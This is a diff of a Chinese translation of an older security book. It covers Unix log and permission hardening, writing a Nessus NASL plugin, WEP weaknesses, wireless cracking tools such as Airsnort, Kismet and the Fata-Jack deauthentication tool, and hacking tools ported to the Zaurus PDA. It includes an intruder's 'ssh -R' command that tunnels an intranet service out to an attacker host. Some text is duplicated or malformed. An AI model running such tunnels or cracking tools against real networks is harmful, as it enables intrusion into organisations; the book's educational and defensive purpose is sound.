+| `/etc/rc.d` | root | root | drwx------ |
+| `/etc/rc.local` | root | root | -rw------ |
+| `/etc/rc.sysinit` | root | root | -rw------ |
+| `/etc/secuertty` | root | root | -rw------ |
+| `/etc/security` | root | root | -rw------ |
+| `/etc/services` | root | root | -rw-r-r-- |
+| `/etc/shadow` | root | root | -r------ |
+| `/etc/ssh/ssh_host_key` | root | root | -rw------ |
+| `/etc/ssh/sshd_config` | root | root | -rw------ |
+| `/etc/ssh/ssh_host_dsa_key` | root | root | -rw------ |
+| `/etc/ssh/ssh_host_key` | root | root | -rw------ |
+| `/etc/ssh/ssh_host_rsa_key` | root | root | -rw------ |
+| `/etc/ttys` | root | root | drwx------ |
+| `/root` | root | root | drwx------ |
+| `/sbin` | root | root | drwxr-xr-x |
+| `/tmp` | root | root | drwxrwxrwt |
+| `/usr/bin` | root | root | drwxr-xr-x |
+| `/usr/etc` | root | root | drwxr-xr-x |
+| `/usr/sbin` | root | root | drwxr-xr-x |
+| `/var/log` | root | root | drwxr-xr-x |
+| `/var/log/authlog*` | root | root | -rw------ |
+| `/var/log/boot*` | root | root | -rw------ |
+| `/var/log/cron*` | root | root | -rw------ |
+| `/var/log/dmesg` | root | root | -rw------ |
+| `/var/log/lastlog` | root | root | -rw------ |
+| `/var/log/maillog*` | root | root | -rw------ |
+| `/var/log/messages*` | root | root | -rw------ |
 
 | 文件名 | 用户 | 组 | 权限 |
 | :--- | :--- | :--- | :--- |
-| /var/log/secure* | root | root | -rw------ |
-| /var/log/spooler* | root | root | -rw-r---- |
-| /var/log/syslog* | root | root | -rw------ |
-| /var/log/utmp* | root | utmp | -rw-rw-r-- |
-| /var/log/wtmp* | root | utmp | -rw-rw-r-- |
-| /var/log/xferlog | root | root | -rw------ |
-| /var/run | root | root | drxr-xr-x |
-| /var/run/*.pid | root | root | -rw-r--r-- |
-| /var/spool/cron | user | root | drwx------ |
-| /var/spool/cron/crontabs/root | root | root | |
-| /var/spool/mail | root | mail | drwxrxr-x |
-| /var/spool/mail/* | user | user | -rw-rw-r-- |
-| /var/tmp | root | root | drwxrwxrwt |
+| `/var/log/secure*` | root | root | -rw------ |
+| `/var/log/spooler*` | root | root | -rw-r---- |
+| `/var/log/syslog*` | root | root | -rw------ |
+| `/var/log/utmp*` | root | utmp | -rw-rw-r-- |
+| `/var/log/wtmp*` | root | utmp | -rw-rw-r-- |
+| `/var/log/xferlog` | root | root | -rw------ |
+| `/var/run` | root | root | drxr-xr-x |
+| `/var/run/*.pid` | root | root | -rw-r--r-- |
+| `/var/spool/cron` | user | root | drwx------ |
+| `/var/spool/cron/crontabs/root` | root | root | |
+| `/var/spool/mail` | root | mail | drwxrxr-x |
+| `/var/spool/mail/*` | user | user | -rw-rw-r-- |
+| `/var/tmp` | root | root | drwxrwxrwt |
 
 ![img/17cb132e62949dc7f5e0eadf90c71f90](img/17cb132e62949dc7f5e0eadf90c71f90)
-
-
-
 
 配置 `/etc/security/audit_control` 以选择要记录的事件。详细说明请参见 http://www.securityfocus.com/infocus/1362。重启以使更改生效。
 
 ### /var/adm/loginlog
 
-在五次登录失败后，所有后续尝试都将记录在此文件中。每个日志事件包含登录名称、终端类型信息和时间。只有当该文件存在时才会记录日志。因此，如果文件不存在，请使用 `touch` 命令创建它。确保 root 用户可以读取此文件。
+在五次登录失败后，所有后续尝试都将记录在此文件中。每个日志事件包含登录名称、终端类型信息和时间。只有当该文件存在时才会记录日志。因此，如果文件不存在，请使用 `touch` 命令创建它。确保 `root` 用户可以读取此文件。
 
 ### /var/adm/sulog
 
-该命令用于登录另一个用户的账户。例如，用户 joe 可以输入 `su` 来登录 jack 的账户：
+该命令用于登录另一个用户的账户。例如，用户 `joe` 可以输入 `su` 来登录 `jack` 的账户：
 
 ```
 joe's_bash]$ su - jack
@@ -4810,19 +5136,21 @@ Password:jackpassword
 [jack's_bash]$
 ```
 
-同样，用户也可以以 root 本地用户登录：
+同样，用户也可以以 `root` 本地用户登录：
 
 ```
-joe's_bash]$ su - 
+joe's_bash]$ su -
 Password:rootpassword
 [root's_bash]$
 ```
 
-记录所有 su 尝试是非常关重要的。这有助于检测恶意本地用户的暴力破解密码尝试。编辑 `/etc/default/su` 并确保 `SULOG` 的值指向 `/var/adm/sulog`。您也可以通过设置 `SYSLOG` 的值为 `YES` 来启用 syslogd 日志。
+
+
+记录所有 `su` 尝试是非常关重要的。这有助于检测恶意本地用户的暴力破解密码尝试。编辑 `/etc/default/su` 并确保 `SULOG` 的值指向 `/var/adm/sulog`。您也可以通过设置 `SYSLOG` 的值为 `YES` 来启用 `syslogd` 日志。
 
 ### /var/log/cron
 
-cron 守护进程将信息在此文件中。编辑 `/etc/syslog.conf` 并确保包含以下行：
+`cron` 守护进程将信息在此文件中。编辑 `/etc/syslog.conf` 并确保包含以下行：
 
 ```
 cron.*[tab]/var/log/cron
@@ -4838,7 +5166,7 @@ mail.*[tab]/var/log/maillog
 
 ### /var/log/messages
 
-此文件包含 syslogd 记录的提示性消息。要启用到此文件的记录，`/etc/syslog.conf` 中必须存在类似下面的行：
+此文件包含 `syslogd` 记录的提示性消息。要启用到此文件的记录，`/etc/syslog.conf` 中必须存在类似下面的行：
 
 ```
 *info:mail.none;authpriv.none;cron.none[tab]/var/log/messages
@@ -4846,7 +5174,7 @@ mail.*[tab]/var/log/maillog
 
 ### /var/log/secure
 
-通过用户名和密码或其他机制进行验证的进程通常记录在此文件中。确保此文件对 root 是只读的。`/etc/syslog.conf` 中必须存在类似下面的行：
+通过用户名和密码或其他机制进行验证的进程通常记录在此文件中。确保此文件对 `root` 是只读的。`/etc/syslog.conf` 中必须存在类似下面的行：
 
 ```
 authpriv.*[tab]/var/log/secure
@@ -4858,10 +5186,15 @@ authpriv.*[tab]/var/log/secure
 
 ```
 [bash]$ last  | head -5
+
 nit pts/0      gateway        Apr 11 10:12 still logged in
+
 anita pts/1      nest           Thu 10 21:14 still logged in
+
 ozzy pts/1      gateway        Thu 10 21:06 - 21:08 (00:02)
+
 kelly pts/1      ftpserver      Thu 10 20:01 - 20:02 (00:00)
+
 asharon pts/0    wireless       Thu 10 16:34 - 21:26 (04:52)
 ```
 
@@ -4871,14 +5204,17 @@ asharon pts/0    wireless       Thu 10 16:34 - 21:26 (04:52)
 
 ```
 [bash]$ who
+
 deepti pts/0      Apr 14 10:12 (intranet)
+
 yash pts/1       Apr 13 21:14 (egmoreftp)
+
 atasha pts/0      Apr 13 20:10 (punehtup)
 ```
 
 ### 日志轮转
 
-日志文件往往增长非常快并消耗大量磁盘空间。对于某些环境，删除旧日志是有意义的。要启用日志轮转，大多数发行版使用 `newsyslog` 或 `logrotate` 等工具。应该使用 cron 守护进程在理想的时间调用这些工具。请检查 `newsyslog` 或 `logrotate` 的帮助页。
+日志文件往往增长非常快并消耗大量磁盘空间。对于某些环境，删除旧日志是有意义的。要启用日志轮转，大多数发行版使用 `newsyslog` 或 `logrotate` 等工具。应该使用 `cron` 守护进程在理想的时间调用这些工具。请检查 `newsyslog` 或 `logrotate` 的帮助页。
 
 ### /var 中的可用空间
 
@@ -4905,40 +5241,51 @@ atasha pts/0      Apr 13 20:10 (punehtup)
 | Solaris | http://www.sun.com/ |
 | SuSE Linux | http://www.suse.com/ |
 
-
-
-
 ### 插件
 
 本节描述了如何使用 Nessus 检测 Web 服务器上是否存在 `/src/password.inc` 文件。首先，我们必须编写一个 NASL 脚本来实现此。该脚本将作为 Nessus 的“插件”。以下是此类脚本的样式：
 
 ```
 if(description)
+
   script_id(99999);
+
   script_version("$Revision: 1.0 $");
+
   script_name(english: "Checks for /src/password.inc");
+
   desc["ENGLISH"] = "/src/password.inc 通常由 XYZ 算法安装，其中包含明文用户密码信息。"
 ```
 
-解决方案：配置您的 Web 浏览器不提供 .inc 文件。
+解决方案：配置您的 Web 浏览器不提供 `.inc` 文件。
 
 风险因素：高；
 
 ```
 script_description(english:desc["english"]);
+
   script_summary(english:"Checks for the existence of /src/password.inc");
+
   script_category(ACT_GATHER_INFO);
+
   script_copyright(english:"This script is Copyright (C)2003 Nitesh Dhanjani");
+
   script_family(english:"CGI abuses");
+
   script_require_ports("Services/www", 80);
+
   exit(0);
+
   include("http_func.inc");
+
   port = 80;
 ```
 
 ```
 if(get_port_state(port))
+
 {
+
   hget = http_get(item:"/src/passwd.inc", port:port);
 
   mysoc = http_open_socket(port);
@@ -4952,11 +5299,15 @@ if(get_port_state(port))
   http_close_socket(mysoc);
 
   if (!("404") <> myrec)
+
 {
+
   security_hole(port);
-}
+
 }
 ```
+
+
 
 当 Nessus 运行脚本以提取插件摘要信息时，`description` 变量的值设置为 1。因此，当 `description` 的值为真且非零时，我们定义了各种插件描述变量值。
 `script_id` 函数为插件设置一个唯一 ID。每个插件的值必须是唯一的。在我们的情况下，可以将其设置为 9999 等高数字以确保值的独立性。`script_version` 函数显示插件的版本信息。更新此内容以反映插件的最新版本是一个好主意。`script_description` 函数设置插件描述，当用户查询插件时 Nessus 客户端会显示。同样，`script_summary` 函数用于设置插件的摘要。
@@ -4990,17 +5341,17 @@ mkdir /www/html
 touch /src/passwd
 ```
 
+
+
 在 Selection（选择）选项卡中输入目标的 IP 地址或名称并点击 Start。如果一切顺利，Nessus 将检测到漏洞，如图 10-2 所示。
 
-# 第10 章：Nessus 脚本语言 (NASL) 65
+# 第10章：Nessus 脚本语言 (NASL)
 
 ![](img/17cb132e6294dc7f5eeadf90c7f51219_0.png)
 
 **图 10-2.** Nessus 报告显示存在 `/src/password`
 
-# 166 第三部分 特专题
-
-# 第 11 章
+# 第11章
 
 ## 无线破解
 
@@ -5010,41 +5361,35 @@ touch /src/passwd
 - 流行工具
 - 无线网络安全
 
-# 170 第三部分 特专题
+无线网络设置非常简单，对于那些讨厌被以太线束缚的人来说是一个福音。由于 802.11 标准使用的无线加密（WEP）协议存在漏洞，从安全角度来看，它们也是噩梦。由于有 `Airodump` 和 `Kismet` 等免费开源工具，任何拥有无线网卡和笔记本电脑的人都可以入侵无线网络。已知有人在城市里“巡战”（war driving），寻找无线网络范围超出办公室区域的企业，以便到达停车场等便利场所。遗憾的是，许多无线网络管理员并没有意识到这一点，并且对这些入侵者毫无感知。本章描述了入侵者获取无线网络的工具和技术，并包含了如何更好地保护它们的建议。
 
-无线网络设置非常简单，对于那些讨厌被以太线束缚的人来说是一个福音。由于 802.11 标准使用的无线加密（WEP）协议存在漏洞，从安全角度来看，它们也是噩梦。由于有 Airodump 和 Kismet 等免费开源工具，任何拥有无线网卡和笔记本电脑的人都可以入侵无线网络。已知有人在城市里“巡战”（war driving），寻找无线网络范围超出办公室区域的企业，以便到达停车场等便利场所。遗憾的是，许多无线网络管理员并没有意识到这一点，并且对这些入侵者毫无感知。本章描述了入侵者获取无线网络的工具和技术，并包含了如何更好地保护它们的建议。
+### WEP 简介
 
-## WEP 简介
+由于 WEP 基于对称共享密钥系统，它使用相同的密钥来加密和解密数据。密钥 `$k$` 长度为128 位或 64 位，由 24 位的初始化向量 `IV`。WEP 负载的构建如下：
 
-由于 WEP 基于对称共享密钥系统，它使用相同的密钥来加密和解密数据。密钥 ($k$) 长度为128 位或 64 位，由 24 位的初始化向量 (IV)。WEP 负载的构建如下：
+- 消息 `$M$` 与其自身的 CRC-32 校验和 `$c(M)$` 拼接：
 
-- 消息 $M$ 与其自身的 CRC-32 校验和 $c(M)$ 拼接：
-
-| $M$ | $c(M)$ |
+| `$M$` | `$c(M)$` |
 
 - IV 应用于密钥之前，并通过 RC4 流加密算法处理：
 
-| $RC4(IV,k)$ |
+| `RC4(IV,k)` |
 
-- 步骤 1 和 2 的结果通过异或（XOR）处理以产生密文。然后将 $IV$ 与密文拼接以生成 WEP 负载：
+- 步骤 1 和 2 的结果通过异或（XOR）处理以产生密文。然后将 `$IV$` 与密文拼接以生成 WEP 负载：
 
-| $IV$ | Cipher-text = $((M),c(M))$ XOR $(RC4(IV,k))$ |
+| `$IV$` | Cipher-text = `$((M),c(M))$` XOR `$(RC4(IV,k))$` |
 
 从上述步骤可以看出，WEP 帧包含明文形式的 IV。许多无线网卡随机选择 IV，而另一些则从 0 开始顺序递增。由于 IV 只有 24 位长，无线网卡或访问点每几小时就会重复一次。
 
-### 总结
+#### 总结
 
 本章演示了编写 Nessus 插件的简易性。首先，展示了一个漏洞示例。接下来，讨论了从零开始创建 NASL 脚本。还提供了如何将 NASL 脚本纳入 Nessus 的说明。通常，大型组织使用漏洞检测对于其安全态势至关重要。
 
-
-
-
-
-# 第 11 章：无线破解 171
+# 第11章：无线破解
 
 请注意，最终传输的帧除了其他信息外，还包含明文 MAC（媒体访问控制）源和目的信息。
 
-Airsnort 等工具利用了 RC4 密钥调度算法（KSA）中的漏洞。这些漏洞的细节记录在 Scott Flueger、Itsik Mantin 和 Adi Shamir 的一篇研究论文中。可以通过以下 URL 获取该论文：http://www.drizzle.com/~aboba/IEEE/rc4_ksaproc.pdf。
+`Airsnort` 等工具利用了 RC4 密钥调度算法（KSA）中的漏洞。这些漏洞的细节记录在 Scott Flueger、Itsik Mantin 和 Adi Shamir 的一篇研究论文中。可以通过以下 URL 获取该论文：`http://www.drizzle.com/~aboba/IEEE/rc4_ksaproc.pdf`。
 
 ### 天线
 
@@ -5056,35 +5401,35 @@ Airsnort 等工具利用了 RC4 密钥调度算法（KSA）中的漏洞。这些
 
 以下是专门经营天线的热门供应商列表：
 
-- Fleeman Anderson & Bird Corp: http://fab-corp.com/
-- HyperLink Technologies: http://www.hyperlinktech.com/
-- NetNimble: http://www.netnimble.net/
-- SuperPass: http://www.superpass.com/
-- Wireless Central: http://www.wirelesscentral.com/
+- Fleeman Anderson & Bird Corp: `http://fab-corp.com/`
+- HyperLink Technologies: `http://www.hyperlinktech.com/`
+- NetNimble: `http://www.netnimble.net/`
+- SuperPass: `http://www.superpass.com/`
+- Wireless Central: `http://www.wirelesscentral.com/`
 
-想构建自己的低成本天线吗？请访问“802.1b Homebrew Antenna Shootout”http://www.turnpoint.net/wireless/has.html。
+想构建自己的低成本天线吗？请访问“802.1b Homebrew Antenna Shootout”`http://www.turnpoint.net/wireless/has.html`。
 
 ### 热门工具
 
-Airsnort 和 Kismet 是最流行且实用的无线破解工具。它们可用于检测无线网络并破解启用 WEP 的网络的加密密钥。
+`Airsnort` 和 `Kismet` 是最流行且实用的无线破解工具。它们可用于检测无线网络并破解启用 WEP 的网络的加密密钥。
 
-> 在启用 WEP 的网络情况下，入侵者必须采取的第一步是使用 Airsnort 等工具获取 WEP 加密密钥。在获取密钥且入侵者成功加入无线网络后，他或她可以使用 Ettercap、tcpdump 和 Ethereal 等流行工具来分析网络流量。
+> 在启用 WEP 的网络情况下，入侵者必须采取的第一步是使用 `Airsnort` 等工具获取 WEP 加密密钥。在获取密钥且入侵者成功加入无线网络后，他或她可以使用 `Ettercap`、`tcpdump` 和 `Ethereal` 等流行工具来分析网络流量。
 
-### Airsnort
+#### Airsnort
 
-Airsnort（如图 11-1 所示）是一种基于 Linux 的网络嗅探工具，通过被动监控无线传输来破解 WEP 加密密钥。Airsnort 可于 http://airsnort.shmo.com/ 获取。目前，Airsnort 支持以下无线网：
+`Airsnort`（如图 11-1 所示）是一种基于 Linux 的网络嗅探工具，通过被动监控无线传输来破解 WEP 加密密钥。`Airsnort` 可于 `http://airsnort.shmo.com/` 获取。目前，`Airsnort` 支持以下无线网：
 
 - Cisco Aeronet
-- 基于 Prism2 的卡。访问 http://www.linux-wlan.org/ 查看支持的卡列表。
-- Orinoco 卡。从 http://airsnort.shmo.com/orinococoinfo.html 下载驱动补丁和信息。
+- 基于 Prism2 的卡。访问 `http://www.linux-wlan.org/` 查看支持的卡列表。
+- Orinoco 卡。从 `http://airsnort.shmo.com/orinococoinfo.html` 下载驱动补丁和信息。
 
-请参阅 Airsnort FAQ 获取常见问题的解答。访问地址为：http://airsnort.shmo.com/faq.html。
+请参阅 `Airsnort` FAQ 获取常见问题的解答。访问地址为：`http://airsnort.shmo.com/faq.html`。
 
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_226_0.png)
 
-### Kismet
+#### Kismet
 
-Kismet（如图 11-2 所示）是一种无线网络嗅探器，可捕获并查看区域内无线网络的信息。它具有以下特性：
+`Kismet`（如图 11-2 所示）是一种无线网络嗅探器，可捕获并查看区域内无线网络的信息。它具有以下特性：
 
 - Ncurses 界面
 - 跳频
@@ -5093,113 +5438,107 @@ Kismet（如图 11-2 所示）是一种无线网络嗅探器，可捕获并查�
 - 支持使用 gpsmap 进行 GPS 映射
 - 实时 WEP 解密
 
-……以及许多其他。访问 http://www.kismetwireless.net/documentation.shtml 获取更多信息。
-访问 http://www.tipsybottle.com/technology/wireless/RedHat8-Kismet-HOWTO.shtml 查看如何在 Linux 上安装和使用 Kismet 的详细说明。本文包含的大部分指令也适用于 Airsn。
+……以及许多其他。访问 `http://www.kismetwireless.net/documentation.shtml` 获取更多信息。
+访问 `http://www.tipsybottle.com/technology/wireless/RedHat8-Kismet-HOWTO.shtml` 查看如何在 Linux 上安装和使用 `Kismet` 的详细说明。本文包含的大部分指令也适用于 `Airsn`。
 
-### Fata-Jack
+#### Fata-Jack
 
-Fata-Jack 是 Wlan-Jack 工具的修改版本。它以关联客户端的源地址向访问点发送认证请求。该认证包被特意构造为包含
+`Fata-Jack` 是 `Wlan-Jack` 工具的修改版本。它以关联客户端的源地址向访问点发送认证请求。该认证包被特意构造为包含
 
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_227_0.png)
 
 无效信息。当访问点接收到此数据包时，它会取消被伪造地址客户端的认证。受害者客户端必须与 AP 重新进行认证。因此，能够访问网络 AP 的恶意用户可以使用此工具发起拒绝服务攻击。
 
-Fata-Jack 可从 http://www.loud-fat-bloke.co.uk/w80211.html 下载。关于 Wlan-Jack 的信息可见 http://802.11ninja.net/。
+`Fata-Jack` 可从 `http://www.loud-fat-bloke.co.uk/w80211.html` 下载。关于 `Wlan-Jack` 的信息可见 `http://802.11ninja.net/`。
 
 ### 无线网络安全
 
-使用 Airsnort 等工具，大约 5,000,000–10,000,000 个数据包就足以破解 WEP 密钥。通常情况下，一个相当活跃的网络会在几小时内传输足够数量的数据包。因此，在部署和管理无线网络时，确保充分安全性必要的。以下是一些建议：
+使用 `Airsnort` 等工具，大约 5,000,000–10,000,000 个数据包就足以破解 WEP 密钥。通常情况下，一个相当活跃的网络会在几小时内传输足够数量的数据包。因此，在部署和管理无线网络时，确保充分安全性必要的。以下是一些建议：
 
 - 1. **将网络视为“不可信”**：无线网络必须被视为不可信，并与内部网络隔离。如果必须允许无线用户访问网络，建议建立 VPN（虚拟专用网络）。
-- 2. **鼓励使用加密工具**：如 SSH 等工具有助于创建加密隧道，并应尽可能使用。内网网站必须支持 SSL。
+- 2. **鼓励使用加密工具**：如 `SSH` 等工具有助于创建加密隧道，并应尽可能使用。内网网站必须支持 SSL。
 - 3. **不允许通过无线方式管理访问点**：某些访问点允许禁用无线管理。这是一个好主意，因为这需要物理访问点才能进行配置。
 - 4. **更改默认 ESSID 并禁用广播**：ESSID（扩展集标识）是输入访问点和以太网卡的配置参数字符串。具有相同 ESSID 的设备参与同一个网络。访问点出厂时配置了特定的默认 ESSID，通常是厂商名称。更改此类默认 ESSID 是好事。许多访问点还会广播其 ESSID 以允许无线客户端从可用网络中选择。建议配置访问点禁用此功能，因为它向授权使用网络的人广播信息。注意，此步骤不能保证很大的安全性，不应依赖它。
 - 5. **MAC 过滤**：考虑利用支持 MAC 过滤的访问点，仅允许具有已知 MAC 地址的选客户端使用网络。然而，这并不能阻止复杂的黑客，因为合法用户的 MAC 地址将以明文传输。这些地址可以从空气中嗅探并伪造以获取网络访问。维护一个授权的 MAC 地址列表是一个理想状态，因此在大型组织中可能无法实施。
 
-
-
-
-
-# 第 12 章
+# 第12章
 
 ## 使用 Sharp Zaurus PDA 进行黑客
 
-+ 本章内容：
-- Kismet
-- Wellenreiter II
-- Nmap
-- Openmap
-- Bing
-- OpenSSH
-- Hping2
-- VNC Server
-- Keypebble VNC 查看器
-- Smbmount
-- Tcpdump
-- Wget
-- ZEthereal
-- zNessus
-- MTR
-- Dig
-- Perl
+本章内容：
+- `Kismet`
+- `Wellenreiter II`
+- `Nmap`
+- `Openmap`
+- `Bing`
+- `OpenSSH`
+- `Hping2`
+- `VNC Server`
+- `Keypebble VNC` 查看器
+- `Smbmount`
+- `Tcpdump`
+- `Wget`
+- `ZEthereal`
+- `zNessus`
+- `MTR`
+- `Dig`
+- `Perl`
 - Zaurus 的在线资源
 - 总结
 
-## 178 第 III 部分：特别主题
-
 Sharp Zaurus PDA（个人数字助理）设备运行着嵌入版本的 Linux 操作系统。该 PDA 内置了对各种紧凑型（Compact-Flash）802.11 网卡的支持。这些功能结合 PDA 的小型外形设计，使 Zaurus 成为一个强大的设备。在本章中，我们将查看许多已经移植到 Zaurus 架构的 Linux 安全工具。在可能的情况下，我们展示了截图以满足你的好奇心。
 
-## KISMET
+### KISMET
 
-Kismet 是一种无线网络嗅探器，可用于捕获和查看区域内无线网络的信息。入侵者不再需要在区域内随身携带笨重的笔记本电脑。只需要一台 Zaurus PDA，配合可以在 http://kismetwireless.net/code/ 下载的 Kismet 端口即可。一旦下载、解压并提取该 URL 提供的 tar.gz 文件，你将在生成的 `kismetarm` 目录中找到一个 ipk 程序包文件。使用文件管理器打开此文件以安装 Kismet，它在 PDA 上运行时看起来如下所示。
+`Kismet` 是一种无线网络嗅探器，可用于捕获和查看区域内无线网络的信息。入侵者不再需要在区域内随身携带笨重的笔记本电脑。只需要一台 Zaurus PDA，配合可以在 `http://kismetwireless.net/code/` 下载的 `Kismet` 端口即可。一旦下载、解压并提取该 URL 提供的 tar.gz 文件，你将在生成的 `kismetarm` 目录中找到一个 ipk 程序包文件。使用文件管理器打开此文件以安装 `Kismet`，它在 PDA 上运行时看起来如下所示。
 
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_232_0.png)
 
-Kismet 的 GUI 界面可以在 http://sourceforge.net/projects/kismet-qte/ 获取。
+`Kismet` 的 GUI 界面可以在 `http://sourceforge.net/projects/kismet-qte/` 获取。
 
-## WELLENREITER II
+### WELLENREITER II
 
-Wellenreiter 是一种无线网络监控器，可用于检测和识别区域内的无线网络。Wellenreiter 的未来版本将支持 WEP 破解和数据包注入。在 http://opie.net.wox/wellenreiter/feed/ 下载 Wellenreiter。
+`Wellenreiter` 是一种无线网络监控器，可用于检测和识别区域内的无线网络。`Wellenreiter` 的未来版本将支持 WEP 破解和数据包注入。在 `http://opie.net.wox/wellenreiter/feed/` 下载 `Wellenreiter`。
 
-## NMAP
+### NMAP
 
-入侵者一旦使用 Kismet 等工具接入无线网络，他或她可能会对网络的 IP 范围进行网络扫描，以便发现并枚举主机。Nmap 是目前可用功能最丰富的端口扫描器之一。（有关如何使用各种方法通过 Nmap 进行端口扫描的详情，请参见第 2 章。）Zaurus 的 Nmap 端口（如下所示）可以在 http://familiar.handhelds.org/familiar/releases/v0.7/base/armv4l/ 获取。
+入侵者一旦使用 `Kismet` 等工具接入无线网络，他或她可能会对网络的 IP 范围进行网络扫描，以便发现并枚举主机。`Nmap` 是目前可用功能最丰富的端口扫描器之一。（有关如何使用各种方法通过 `Nmap` 进行端口扫描的详情，请参见第 2 章。）Zaurus 的 `Nmap` 端口（如下所示）可以在 `http://familiar.handhelds.org/familiar/releases/v0.7/base/armv4l/` 获取。
 
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_233_0.png)
 
-## QOPENMAPFE
+### QOPENMAPFE
 
-Qpenmapfe 是图 12-3 所示 Zaurus Nmap 端口的 GUI 前，可以在 http://home.midsouth.rr.com/zaurus/ 获取。对于那些不熟悉或不使用 Nmap 参数的人来说，这是一个非常有用的工具。
-
-## 180 第 III 部分：特别主题
+`Qpenmapfe` 是图 12-3 所示 Zaurus `Nmap` 端口的 GUI 前，可以在 `http://home.midsouth.rr.com/zaurus/` 获取。对于那些不熟悉或不使用 `Nmap` 参数的人来说，这是一个非常有用的工具。
 
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_234_0.png)
 
-## BING
+### BING
 
-在所示对话框中，Bing 是一个自动化端口扫描的简单脚本。执行时，它通过广播 ping 请求来发现当前子网上的活动主机。然后它会列出子网中响应 ICMP 回显请求的主机列表。然后你可以从给定的列表中选择一个主机进行端口扫描（使用 Nmap）。从 http://www.claystuckey.com/chad/bing_0.0.1_arm.ip 下载 Bing 的包文件。
+在所示对话框中，`Bing` 是一个自动化端口扫描的简单脚本。执行时，它通过广播 ping 请求来发现当前子网上的活动主机。然后它会列出子网中响应 ICMP 回显请求的主机列表。然后你可以从给定的列表中选择一个主机进行端口扫描（使用 `Nmap`）。从 `http://www.claystuckey.com/chad/bing_0.0.1_arm.ip` 下载 `Bing` 的包文件。
 
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_234_1.png)
 
-## OPENSSH
+### OPENSSH
 
-OpenSSH 套件由支持 SSH 协议的免费客户端组成。它还包括一个免费的 SSH 服务器。Zaurus
+`OpenSSH` 套件由支持 SSH 协议的免费客户端组成。它还包括一个免费的 SSH 服务器。Zaurus
 
-## 第 12 章：使用 Sharp Zaurus PDA 进行黑客 181
+# 第12章：使用 Sharp Zaurus PDA 进行黑客
 
-OpenSSH 的 Zaurus 版本可以在 http://killefiz.de/zaurus/showdetail.php?app=1035 找到。入侵者可以使用 OpenSSH 创建一个从组织网络通往其家中的安全隧道。考虑以下情况：已接入组织无线网络的入侵者在自己的 PDA 上启动了以下命令：
+`OpenSSH` 的 Zaurus 版本可以在 `http://killefiz.de/zaurus/showdetail.php?app=1035` 找到。入侵者可以使用 `OpenSSH` 创建一个从组织网络通往其家中的安全隧道。考虑以下情况：已接入组织无线网络的入侵者在自己的 PDA 上启动了以下命令：
+
+
 
 ```
 ssh -R 80:intranet.victorgansanexample.com:8000 intruder@intruders_ip
 ```
 
-在入侵者发出此命令并输入其账户或账户密码后，组织网络与其家中之间将建立一个安全隧道。入侵者可以使用 OpenSSH 创建一个从组织网络通往其家中的安全隧道。考虑以下情况：已接入组织无线网络的入侵者在自己的 PDA 上启动了以下命令：
 
-（此处为原文重复，已按要求忽略）
+
+在入侵者发出此命令并输入其账户或账户密码后，组织网络与其家中之间将建立一个安全隧道。入侵者可以使用 `OpenSSH` 创建一个从组织网络通往其家中的安全隧道。考虑以下情况：已接入组织无线网络的入侵者在自己的 PDA 上启动了以下命令：
 
 ## HPING2
 
-Hping2 是一种用于发送任意数据包的工具。入侵者可以使用它来测试防火墙规则。Hping2 的手册可以在 http://www.manpage 获取。下图显示了 Hping2 带有 SYN+ACK 数据包在 Zaurus 上的运行。
+`Hping2` 是一种用于发送任意数据包的工具。入侵者可以使用它来测试防火墙规则。`Hping2` 的手册可以在 `http://www.manpage` 获取。下图显示了 `Hping2` 带有 SYN+ACK 数据包在 Zaurus 上的运行。
 
 | hping 2 output |
 |---|
@@ -5207,117 +5546,62 @@ Hping2 是一种用于发送任意数据包的工具。入侵者可以使用它�
 |sent|received|dropped|lost|packet loss|round-trip min|avg|max|stddev|
 |---|---|---|---|---|---|---|---|---|
 |0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
